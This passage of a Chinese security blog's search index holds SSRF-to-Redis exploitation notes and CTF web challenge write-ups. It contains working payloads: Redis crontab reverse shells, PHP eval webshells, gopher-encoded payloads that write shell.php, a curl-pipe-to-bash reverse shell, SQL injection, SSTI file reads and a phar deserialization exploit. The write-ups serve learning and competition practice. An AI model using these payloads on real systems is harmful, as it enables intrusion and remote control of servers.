，对一个或多个key求逻辑异或，并将结果保存到destkeyBITOP NOT destkey key ，对给定key求逻辑非，并将结果保存到destkey 所以可以将payload取反，然后用bitop not还原数据。 123set x &quot;\\xc3\\xc0\\x8f\\x97\\x8f\\xdf\\x9a\\x89\\x9e\\x93\\xd7\\xdb\\xa0\\xaf\\xb0\\xac\\xab\\xa4\\xdd\\x9e\\x9e\\xdd\\xa2\\xd6\\xc4\\xdf\\xc0\\xc1&quot; //x=&lt;?php eval($_POST[&quot;aa&quot;]); ?&gt;bitop not x xget x","categories":[{"name":"协议学习","slug":"协议学习","permalink":"http://yoursite.com/categories/协议学习/"}],"tags":[]},{"title":"SSRF","slug":"SSRF学习","date":"2019-09-27T16:00:00.000Z","updated":"2020-11-21T13:15:44.634Z","comments":true,"path":"2019/09/28/SSRF学习/","link":"","permalink":"http://yoursite.com/2019/09/28/SSRF学习/","excerpt":"","text":"SSRF学习URL结构url为统一资源定位符。 url标准格式如下： 1[协议类型]://[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID url完整格式如下： 1[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID] 协议类型：一般含有http,https,file,ftp,gopher,wais,news,telent 凭证信息：username:password，以@结尾 Curl与ParseUrl解析url区别blackhat2017中提到了Curl与ParseUrl解析url的区别，要求Curl版本&lt;=7.54.0。 经过本地7.55.1测试，curl在port后不允许有空格出现Port number ended with &#39; &#39;，准确来说，port后只允许/。 本地复现一下，我在服务器中放置了1.txt，下面谈谈我的发现。 curl会将空格后的内容看成一个目录比如下面代码中的URL就解析成/ @www.baidu.com/../1.txt经过apache解析成/1.txt 经过抓包发现请求头中的Host为ip:port @www.baidu.com，应该是apache将host空格之后的内容截断了。 123456789101112131415&lt;?php$url=\"http://u:p@ip:port @www.baidu.com/../1.txt\"; var_dump(parse_url($url)); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); //执行并获取HTML文档内容 $output = curl_exec($ch); //释放curl句柄var_dump( curl_error($ch) );var_dump($output); curl_close($ch);?&gt; html成功返回1.txt的内容，而且parse_url解析的host为www.baidu.com。 12345678array (size=5) 'scheme' =&gt; string 'http' (length=4) 'host' =&gt; string 'www.baidu.com' (length=13) 'user' =&gt; string 'u' (length=1) 'pass' =&gt; string 'p@ip:port ' (length=17) 'path' =&gt; string '/../1.txt' (length=9)D:\\phpstudy_pro\\WWW\\test\\1.php:12:string '' (length=0)D:\\phpstudy_pro\\WWW\\test\\1.php:13:string 'ssrf success! DNSRebindingDNS服务器用来将域名解析到正确的IP地址，DNS TTL(Time To Live)为IP地址在DNS服务器上的缓存时间。 通常，为了加快解析时间，当DNS服务器接收到解析请求时，会将解析结果存在缓存中，如果在TTL时间内在此接收到此域名的解析请求，直接在缓存中返回结果。 我们可以通过控制恶意DNS服务器，设置一个相当低的TTL时间，不断变换IP地址以造成DNSRebinding攻击，可以利用它来访问内网IP地址。 这是一个工具,该工具能够生成一个域名，能够指定两个IP地址，该工具会将该域名在这两个地址间随机切换。 Redis漏洞利用在介绍漏洞利用之前，首先了解一下Redis的数据传输协议。 Redis数据传输协议Redis使用RESP序列化协议将传输的数据分为以下五种最小单元类型，单元结束时加上\\r\\n换行符： 单行回复：回复的第一个字节是 “+” 错误信息：回复的第一个字节是 “-“ 整形数字：回复的第一个字节是 “:” 多行字符串：回复的第一个字节是 “$” 数组：回复的第一个字节是 “*” 任意文件写入由于Redis的备份功能可以任意指定目录，这就造成了任意文件写入漏洞，主要有反弹shell、写WebShell、写ssh公钥这几种攻击方式。 弹shell利用方式首先讲一下Linux的定时任务，在Linux中corntab命令用于设置周期性被执行的任务，crontab命令从标准输入设备读取指令，并存放于crontab文件中，以供之后的读取和执行。 crontab命令读取目录 12/var/spool/cron//etc/crontab crontab文件格式如下 1234567minute hour day month week command操作符有* 取值范围内所有数字/ 每隔多久执行一次x-z 从x-zx，z 每x和z执行一次* * * * * 代表每分钟执行一次 我们利用Redis的备份功能，在crontab读取命令的目录中，写入shell，即可执行shell命令。 1234set x \"* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\"config set dir /var/spool/cron/config set dbfilename rootsave 利用条件 弹shell要求Redis在root用户下运行 由于Redis备份的是Redis格式的数据，所以会包含许多乱码，在Ubuntu下不能执行（Centos会自动忽略错误信息）。 写入WebShell1234set x &quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot;config set dir /Web目录config set dbfilename &quot;shell.php&quot;save 利用条件 Web目录写入权限 写入ssh公钥12345678本地生成密钥对ssh-keygen -t rsa##将公钥写入服务器/root/.ssh文件夹中set x &quot;公钥&quot;config set dir /root/.sshconfig set dbfilename &quot;authorized_keys&quot;save 攻击者执行 1ssh -i 私钥 root@ip 利用条件 root权限 主从复制RCE虽然redis读取写入的速度很快，当大量的访问数据库的时候，为了分担压力，Redi支持主从复制功能，也就是读写分离，节点复制主节点全部数据(数据复制只能由主节点复制到从节点)，由主节点提供写服务，从节点提供读服务，可大大提高Redis服务器的并发量。 漏洞利用原理可扩展module为了使Redis的使用更加的灵活，Redus4.0以上版本支持了可扩展的module，并给出了API文件和官方示例。 用户只需按照API编写自己的module，并使用module load module.so命令加载模组，即可往Redis服务器中添加自己的命令，非常的方便，但是也能自定义函数完成RCE。 这里使用github上大佬的EXPRedis-rouge-server，该EXP编写了一个system.exec命令，加载module后能直接进行RCE。 但是这只是在自己的Redis服务器上实现了RCE，如何将他传入其他的Redis服务器呢？主从复制是不会将module也复制给从节点的，这就需要用到下面的主从复制全量同步。 主从复制的全量同步master服务器会开启一个后台进程用于将redis中的数据生成一个rdb文件，与此同时，服务器会缓存所有接收到的来自客户端的写命令（包含增、删、改），当后台保存进程处理完毕后，会将该rdb文件传递给slave服务器，而slave服务器会将rdb文件保存在磁盘并通过读取该文件将数据加载到内存，在此之后master服务器会将在此期间缓存的命令通过redis传输协议发送给slave服务器，然后slave服务器将这些命令依次作用于自己本地的数据集上最终达到数据的一致性。 这里有一篇博文，想深入了解主从复制可以看看https://www.cnblogs.com/kismetv/p/9236731.html&gt; 通过上面的两点可以知道当进行主从复制的全量同步时，会传输一个文件给slave服务器，所以我们可以利用这点，通过Python伪造一个恶意Redis服务器恶意Redis服务器伪造，当收到服务器的slave请求时，模拟全量同步的过程，将我们的exp.so发送到slave服务器中，在slave服务器执行module load exp.so即可实现RCE。 漏洞复现一台Redis服务器 1docker pull shuogesha/redis5.0.5 伪造恶意Redis服务器 1https://github.com/LoRexxar/redis-rogue-server exp 1https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 启动靶机Reids的docker，将exp.so与伪造的Redis服务器放入同一文件夹 执行命令 1python3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 攻击机IP 注意：攻击机与目标机必须能够互相访问。 现在恶意module已经被目标及加载，连接上即可执行命令。 恶意module加载RCE主从复制RCE要求攻击机与目标机必须能够互相访问，但如果靶机不能访问外网主从复制就打不通，那能不能利用备份功能写入恶意module呢，答案是不能，之前说过，备份存入的文件是以Redis的特殊结构保存，在ELF文件看来就是乱码，因为ELF文件对格式要求严格，所以不能执行。 所以只能配合Web页面的文件上传，上传恶意module，然后再加载module实现RCE。 gopher协议gopher协议格式： 1gopher://ip:port/连接符+TCP/IP数据 gopher会将连接符后面的数据发送给相应的端口，可以是字符串也可以是其他格式的请求包，比如GET,POST,redis,mysql未授权访问，将数据使用url编码，gopher才能正常解析。 dict协议dict协议格式: 12dict://ip:port/命令:参数:参数dict://ip:port/命令 参数 参数 dict协议是词典网络协议，可以连接字典服务器（比如Redis），不过只支持没有密码的Redis，因为dict只能逐行命令执行，每执行一行后，都会QUIT断开连接，所以无法保存身份认证信息。 SSRF+Redis利用途径gopher发送Redis数据包首先需要知道Redis数据包的格式，gopher才能正确解析。 使用socat端口转发获取Redis流量： 1socat -v tcp-listen:2333,fork tcp-connect:127.0.0.1:6379 将来自2333端口的流量转发至6379端口(也就是Redis服务器端口)，-v参数能够显示转发的流量。 使用redis-cli连接2333端口 1./redis-cli -h 127.0.0.1 -p 2333 执行set x 1命令可以看到转发的流量为，这是经过RESP协议序列化后的数据 1234567*3\\r$3\\rset\\r$1\\rx\\r$1\\r1\\r 所以我们只需要将payload转换成如上形式，然后url编码，使用gopher发送即可，前人栽树，后人乘凉，github上有许多生成payload脚本https://github.com/xmsec/redis-ssrf (如果是get方式传参，需要进行二次编码) dict逐行执行命令首先尝试直接发送payload 1dict://ip:port/set:x:&quot;&lt;?php eval($_POST[&apos;aa&apos;]);?&gt;&quot; 报错，抓取一下流量发现在?处被截断。 16进制编码绕过截断对于&lt;?这样的非法字符，需要用16进制编码，正常发送。 1set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot; 成功写入 123set x &quot;\\x3C\\x3Fphp\\x20eval($_POST[&apos;aa&apos;])\\x3B\\x3F\\x3E&quot;config set dir /var/www/htmlconfig set dbfilename &quot;shell.php&quot; bitop命令绕过截断Bitop命令为Redis位操作，BITOP命令支持四个位运算：AND，OR，XOR 和NOT 1234BITOP AND destkey key [key ...] ，对一个或多个key求逻辑并，并将结果保存到destkeyBITOP OR destkey key [key ...] ，对一个或多个key求逻辑或，并将结果保存到destkeyBITOP XOR destkey key [key ...] ，对一个或多个key求逻辑异或，并将结果保存到destkeyBITOP NOT destkey key ，对给定key求逻辑非，并将结果保存到destkey 所以可以将payload取反，然后用bitop not还原数据。 123set x &quot;\\xc3\\xc0\\x8f\\x97\\x8f\\xdf\\x9a\\x89\\x9e\\x93\\xd7\\xdb\\xa0\\xaf\\xb0\\xac\\xab\\xa4\\xdd\\x9e\\x9e\\xdd\\xa2\\xd6\\xc4\\xdf\\xc0\\xc1&quot; //x=&lt;?php eval($_POST[&quot;aa&quot;]); ?&gt;bitop not x xget x url=http://root@127.0.0.1:5000@baidu.com/%3furl=http%3A//127.0.0.1%3A6379/%2520HTTP/1.1%250D%250A%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252441%250D%250A%250A%250Ayezaizheli%253C%253Fphp%2520eval%2528%2524_POST%255B%2527aa%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25247%250D%250Amy2.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A url=http://root@127.0.0.1:5000@baidu.com/%3furl=http%3A//127.0.0.1%3A6379/%2520HTTP/1.1%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2fflag%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2fvar%2fwww%2fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A","categories":[{"name":"协议学习","slug":"协议学习","permalink":"http://yoursite.com/categories/协议学习/"}],"tags":[]},{"title":"BUUCTF","slug":"BUUCTF","date":"2019-09-09T16:00:00.000Z","updated":"2020-10-02T04:55:46.673Z","comments":true,"path":"2019/09/10/BUUCTF/","link":"","permalink":"http://yoursite.com/2019/09/10/BUUCTF/","excerpt":"","text":"checkin​ 是一道文件上传题，首先抓包分析一波，发现&lt;?,php,等都不行，直接上传基本凉凉，于是考虑解析漏洞。 ​ 发现题目服务端是nginx，htaccess也不行，在网上看到了一个姿势，user.ini构建后门 在这里记录一下用这个姿势的条件 ​ 1.上传目录下要有可执行的php文件。 ​ 2.服务器使用CGI/FastCGI模式 ​ 3.php版本要在5.3.0后 ​ 创建user.ini写入 12GIF89a auto_prepend_file=test.jpg ​ 于是上传一句话木马,名为test.jpg &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;aa&#39;]);&lt;/script&gt; ​ 这样我们的文件就会被包含到同目录中的那个index.php中了，接下来的操作就不说了。 easy_tornado​ 这道题算是我做过的第一道ssti题目，首先发现提示中的render可以知道该题使用tornado模板写的，参考writeup，发现tornado的配置可以放在handler.settings中于是得到payload: 得到secret_cookie。 随便注​ 随便注了一下发现基本都被过滤了T_T! ​ 看了网上的wp，发现这是一道堆叠注入。emmm，这里就不再赘述了，记录一下网上的各种payload 方法1：存储过程绕过 ​ 1.把关键字编程哈希值绕过 payload: 11%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql; ​ 2.使用concat连接关键字 payload: 1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+ 方法2:重命名表名，字段名 payload： 1';alter table `1919810931114514` add(id int NULL);rename table `words` to `tmp`;rename table `1919810931114514` to `words`; easysql​ 这里涉及MYSQL的一种管道符模式。可以在MYSQL中开启支持管道符来进行字符串的拼接操作。构造payload : 11;set sql_mode=pipes_as_concat;select 1 条件：查询语句中有||。 ​ 还有一种payload 1*,2 ​ 这种也比较好理解，这样就把查询语句分成了两部分 SSRFME​ 方法一：字符串拼接 ​ 源码中生成sign是这样一行代码 1hashlib.md5(secert_key + param + action).hexdigest() ​ 你得到sign是这样的 ​ 你只能得到secret_key+param+scan的值。 ​ 签名检测代码是这样的 ​ 然后看到exec()里的代码(代码就不帖了)，就可以得到解题方法：用scan来读flag.txt中的值保存到result.txt中，然后用read把它读出来。 ​ 所以访问/De1ta，payload:param=flag.txt,通过cookie上传action=readscan,sign的值可以通过访问/getSign上传param=flag.txtread来获得。这样两种sign都是secert_key+flag.txt+readscan，完美的拼接成功拿到flag ​ 方法二：local_file读取文件 ​ 先生成已知值：md5(secret_key+local-file:///proc/self/cwd/flag.txt +scan)然后用hashpump生成MD5(secret_key+local-file:///proc/self/cwd/flag.txt +scan+read)的值就行了。 ​ ps:local-file:///proc/self/cwd/代表当前目录，local-file一定要绝对地址。 这里推荐一个详细的writeup SSRFME一题三解 fakebook​ waf没有过滤load_file，给出了文件地址，直接load_file读取/var/www/flag.php,payload： 11 union select 1,load_file('/var/www/flag.php'),1,1 可以在源码中看到flag [RCTF2015]EasySQL​ 打开题目是一个登陆页面，随便注册一个登陆。 ​ 在用户界面有一个重置密码，可能是二次注入。返回注册页面试了一试，发现username和email处存在过滤。首先试一下闭合类型，注册&#39;12&quot;\\然后登陆，修改密码发现报错。 那这题应该是一个双引号闭合的报错注入。接下来就是爆表,列。 11&quot;||updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x3a),1)# 发现有个flag表，进去之后没有flag，于是搜一下别的表。 11&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)),0x3a),1)# 发现显示不全，限制一下输出 11&quot;||updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;users&apos;)&amp;&amp;(column_name)regexp(&apos;^r&apos;)),0x3a),1)# 得到列名，这里regexp是正则表达式函数，这里就不再赘述。接下来爆flag 11&quot;||updatexml(1,concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a),1)# 也是同样显示不全，这里可以用一个reverse函数反向输出一下查到的字符串。然后自己手动拼一下flag就出来了 11&quot;||updatexml(1,reverse(concat(0x3a,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&apos;^f&apos;)),0x3a)),1)# [RoarCTF 2019]PHPShe​ 一道框架类的题，对于框架类的题目，不是CVE就是出题人修改了源码制造的漏洞,这题都有。 ​ ​ 发现是PHPSHE v1.7于是搜了一下有 CVE-2019-9762，分析一下，在common.php中，会对上传的参数的变量名根据上传方式加上前缀。 ​ 利用点是/include/plugin/payment/alipay/pay.php，变量order_id是可控的。 ​ 通过get方式上传id，进入pe_dbhold函数，该函数将参数进行addslashes转义处理，然后传入了order_table函数中，该函数将变量用下划线进行截取。 ​ 继续跟进pe_select函数。 ​ 发现order_id作为表名被传入，所以可以控制order_id进行注入。官网包中有phpshe.sql告诉我们数据库配置。 ​ 发现admin表中有6个字段，但是字段名都有下划线，所以必须用无列名注入。 ​ payload=pay` where 1=1 union select 1,2,((select`3`from(select 1,2,3,4,5,6 union select * from admin)a limit 1,1)),4,5,6,7,8,9,10,11,12%23_ 解密得到md5密码。 登陆后台发现一处文件上传点，可以上传jpg,txt,zip文件，并可以得到绝对路径。 ​ ​ 将题目源码和官方源码diff之后发现题目源码pclzip.class.php中多了一个__destruct()类，作用是解压压缩包，所以估计是通过phar反序列化触发。 ​ 于是全局搜索include了pclzip.class.php的类，找到触发点\\module\\admin\\moban.php, 分析一波代码，发现del方法中调用pe_dirdel()方法，跟进发现含有phar触发函数is_file()，而且文件名高度可控，所以思路就出来了，使用phar协议反序列化上传的文件，解压含有shell的压缩包，但是还需要通过pe_token_match()的检验 ​ 这个函数作用是检验token和referer值，我们可以看到token是以post或者get方式上传的，通过审查代码，发现token是放在session中的，所以只要session不变token就不会变，之前上传文件的地方也用了token检验，但是并不需要我们提交token，所以猜测token藏在隐藏表单中，果然找到了。至于Referer只要与和网站host保持一致就好了。 ​ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpclass PclZip&#123; // ----- Filename of the zip file var $zipname = ''; // ----- File descriptor of the zip file var $zip_fd = 0; // ----- Internal error handling var $error_code = 1; var $error_string = ''; // ----- Current status of the magic_quotes_runtime // This value store the php configuration for magic_quotes // The class can then disable the magic_quotes and reset it after var $magic_quotes_status; var $save_path; // -------------------------------------------------------------------------------- // Function : PclZip() // Description : // Creates a PclZip object and set the name of the associated Zip archive // filename. // Note that no real action is taken, if the archive does not exist it is not // created. Use create() for that. // -------------------------------------------------------------------------------- function __construct($p_zipname) &#123; //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', \"zipname=$p_zipname\"); // ----- Tests the zlib // ----- Set the attributes $this-&gt;zipname = $p_zipname; $this-&gt;zip_fd = 0; $this-&gt;magic_quotes_status = -1; // ----- Return //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1); return; &#125;&#125;$f=new PclZip(\"/var/www/html/data/attachment/brand/3.zip\");//自己上传的zip文件地址$f-&gt;save_path='/var/www/html/data';//解压缩地址，只要不离谱$phar = new Phar(\"phar.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub，增加gif文件头用以欺骗检测$phar-&gt;setMetadata($f); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件$phar-&gt;stopBuffering();?&gt; ​ 将文件名和压缩路径改一改，生成phar文件改名txt，上传，触发，上菜刀，/flag一气呵成。 [SUCTF 2018]GetShell一打开是一个文件上传页面，随便上传一个马，发现对第六位之后的内容进行了过滤，于是先fuzz一下看哪些可见字符能用。 能用字符只有~&amp;()_[];，取反能用，因为是上传文件，所以url编码不能用，那思路就是用汉字取反得到shell代码 在UTF-8编码格式下，一个字符一般占用一个字节，一个汉字一般占用三个字节，取反操作会把数据变成字节流，按位取反，PHP会将取反后的值变成字符串变量，因为而双字节的UTF-8字符二进制一般以11开头，取反之后会比较小，一般是不可见字符，所以第二、三个字节获得可见字符的概率高。 12345678&lt;?php$a='看';$a=(~$a);echo $a[1];11100111100111001000101100011000 01100011 01110100 18 c t//输出c fuzz脚本 1234567891011121314&lt;?php$str=\"园邪够虹努蹄酿日星坚舞化陡管研顷活膛兼真果丸平插上絮辫每剩介海茂冒障柄级未仪肝向俭沿补朽唐报聪尤刘赚妈笼扔碍使叶炎漠洞常致鞭睡雾纠鼻莲桃郊匆欣亚洒贪言岔迎目堡舟裙户屿阿贯灿汉遗租榜愉甜碎泥酱思盼贴镇读\";//随机字典$j=0;$a='e';//想得到的字符for($i=0;mb_strlen($str, 'utf-8');$i++)&#123; $t=mb_substr($str, $i,1, 'utf-8'); $z=(~$t); if($z[1]==$a)&#123; echo $t; echo $z; die; &#125;&#125;//目标assert_POST 现在还需要得到1就能得到最终payload了，在PHP中true=1; 123$__=[];$___=[];$_=$__==$___;//true=1 现在就可以得到最终的payload 1&lt;?=$__=[];$___=[];$_=$__==$___;$__=(~果);$___=$__[$_];$__=(~化);$___.=$__[$_];$___.=$__[$_];$__=(~障);$___.=$__[$_];$__=(~捷);$___.=$__[$_];$__=(~独);$___.=$__[$_];$__=(~研);$____=$__[$_];$__=(~每);$____.=$__[$_];$__=(~尤);$____.=$__[$_];$__=(~笼);$____.=$__[$_];$__=(~竿);$____.=$__[$_];$_____=$$____;$__=(~研);$___($_____[$__[$_]]);//assert($_POST[_]); 上传后执行system(‘cat /flag’);获得flag [CISCN2019 华东南赛区]Web4​ file协议被BAN，根据路由判断是flask，从CVE-2019-9948可以得知local_file可以读取本地文件，读取源码local_file///app/app.py。 ​ 在/flag路由下获取flag,要求username=fuck，随机数种子设为uuid.getnode()，该方法会使用机器的mac地址作为默认随机数种子。 local_file:///sys/class/net/eth0/address获得随机数种子， 123import randomrandom.seed(0x0242ae00fb24)print str(random.random()*233) 使用flask-cookie工具获得cookie，得到flag。 [BJDCTF2020]Cookie is so stable网图 1234Twig &#123;&#123;7*&apos;7&apos;&#125;&#125; #输出49Jinja&#123;&#123;7*&apos;7&apos;&#125;&#125; #输出7777777 测试得到为Twig模板注入 [网鼎杯 2020 朱雀组]phpweb​ 题目用的call_user_func()，并过滤了很多函数，fuzz一下有啥函数没过率，发现highlight_file，读源码，发现存在反序列化可以绕过WAF。 [安洵杯 2019]easy_serialize_php​ 反序列化题，在phpinfo中可以找到flag位置，过滤时存在字符串逃逸，利用extract($_POST)插入非法字符到$_SESSION中。 12345678910111213&lt;?phpfunction filter($img)&#123; $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img);&#125;$b['user']=\"guest\";$b['function']=\"show_image\";$b['flagflag']='\";s:1:\"1\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";&#125;';//d0g3_f1ag.php$b['img']=base64_encode(\"guest_img.png\");echo serialize($b).\"\\n\";echo filter(serialize($b));var_dump(unserialize(filter(serialize($b)))); [MRCTF2020]PYWebsite​ 关闭JS，抓包得到一段JS代码，验证无法绕过，直接访问flag.php，修改X-Forwarded-For头，得到flag。 [网鼎杯 2020 朱雀组]Nmap​ Nmap -oG 将报告保存到文件中payload,短标签，phtml绕过WAF:&#39; &lt;?= @eval($_POST[&quot;aa&quot;]);?&gt; -oG aa.phtml &#39;。 [BSidesCF 2020]Had a bad day​ 在category出随便输入获得include报错，使用include特性尝试包含一波flag.php ​ woofers/../flag,发现flag.php存在，尝试使用PHP://filter伪协议读取一波源码，发现category被限制了 123if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\"))&#123; include ($file . '.php');&#125; ​ 使用filter伪协议特点，可以添加一层无用的筛选列表绕过WAF。 1php://filter/read=convert.base64-encode/woofers/resource=flag ##[WUSTCTF2020]朴实无华 robots.txt可找到源码，第一关intval绕过1e10，第二关弱类型md5，要求加密前和加密后都以0e开头而且后面都是数字，爆破看脸，网上payload0e215962017，第三关使用linux特殊环境变量内部字段分隔符（internal field separator） ${IFS}绕过空格。 [BJDCTF2020]EasySearchindex.php.swp找到源码，SSI注入，首先找flag&lt;!--#exec cmd=&quot;find / -name fla*&quot;--&gt; &lt;!--#exec cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt; [GWCTF 2019]枯燥的抽奖​ 随机数种子爆破 1234567891011str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'#字典str2='U0Ssf69rN4'#密文str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint res ​ 下载爆破工具 ，进入目录make一下。 ​ 在相应环境（PHP 7.1.0+）下生成payload。 123456789101112&lt;?phpmt_srand(503734369);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str;?&gt; [GYCTF2020]FlaskApp​ 一道flask SSTI，通过模板注入找到源码 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/etc/passwd&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 过滤了很多函数，但是可以通过字符串拼接绕过，读取flag。 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125; [CISCN2019 华东南赛区]Web11打开网站发现要素：build with smarty，应该是一道smarty模板注入，注入点在XFF头。 {$smarty.version}发现smarty版本是3.1.30，查看对应版本的官方文档，发现任意函数执行漏洞。 {if 任意函数执行}{/if}。 payload={if system(&#39;cat /flag&#39;)}{/if} [BJDCTF 2nd]duangShellvim -r修复文件得到源码，exec无回显，基本上是弹shell了，在服务器部署一个bash脚本 1bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 1curl http://ip/bash脚本名 | bash 反弹shell成功，使用find / -name &quot;flag&quot;，找到flag [GKCTF2020]EZ三剑客-EzWeb有一个输入url的地方，查看界面源码发现secret，暴露出内网IP ，利用http扫一波内网地址，发现在173.109.229.12存在某个服务，扫一波端口，发现是Redis服务，题目过滤了dict协议，但是没有过滤gopher协议，修改一下脚本，直接一发打过去。 1gopher://173.109.229.12:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20/flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 在url处输入http://173.109.229.12/shell.php得到flag。 [BJDCTF 2nd]elementmaster打开界面源码发现可疑十六进制数据，转换之后是Po???,网上搜了一下发现是元素周期表！！！，不愧是元素大师题 按元素周期表中的元素.php依次访问(脚本)，得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php，访问得到flag。 [MRCTF2020]套娃第一关字符串解析绕过，PHP会将变量中含有[.等非法字符转换成_，利用b.p.u.t绕过，用换行符%0a绕过美元符正则，进入第二关。 一堆jsfuck，丢入控制台，得到参数Merak ,POST传入Merak 得到源码，限制ip在127.0.0.1，PHP对于IP的处理通常是首先判断是否存在Client-ip,然后判断是否存在X-Forwarded-For，最后判断Remote_attr，在这里在报文头部加上client-ip: 127.0.0.1可以直接绕过,然后file参数是一段很简单的逆运算 12345678&lt;?$a=\"flag.php\";for ($i=0;$i&lt;strlen($a);$i++)&#123; $flag.=chr(ord($a[$i])-$i*2);&#125;echo base64_encode($flag);?&gt; 最后用php://input绕过一下2333参数得到flag。 [FBCTF2019]RCEService要求用json格式输入命令{&quot;cmd&quot;:&quot;ls&quot;},得到index.php但是不能读取。然后百度一下，他们都说先知可以拿到源码，发现正则使用的是preg_match，可以使用多行绕过。 多行绕过 源码中通过putenv设置了PATH环境变量，PATH环境变量存放的是命令搜索路径，所以只能通过绝对路径拿到命令，/bin/cat。 1cmd=&#123;%0A&quot;cmd&quot;:%20&quot;/bin/cat%20/home/rceservice/flag&quot;%0A&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"}],"tags":[]},{"title":"ctf","slug":"ctf总结","date":"2019-09-09T16:00:00.000Z","updated":"2020-11-28T12:59:35.732Z","comments":true,"path":"2019/09/10/ctf总结/","link":"","permalink":"http://yoursite.com/2019/09/10/ctf总结/","excerpt":"","text":"CTFmd5常见绕过强比较绕过数组绕过 ​ md5碰到数组数据时返回null，null===nulll绕过。 md5碰撞 ​ fastcoll 弱比较绕过利用科学计数法0e+任何数字都为0。 以下值在md5加密后以0E开头： 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 以下值在sha1加密后以0E开头： 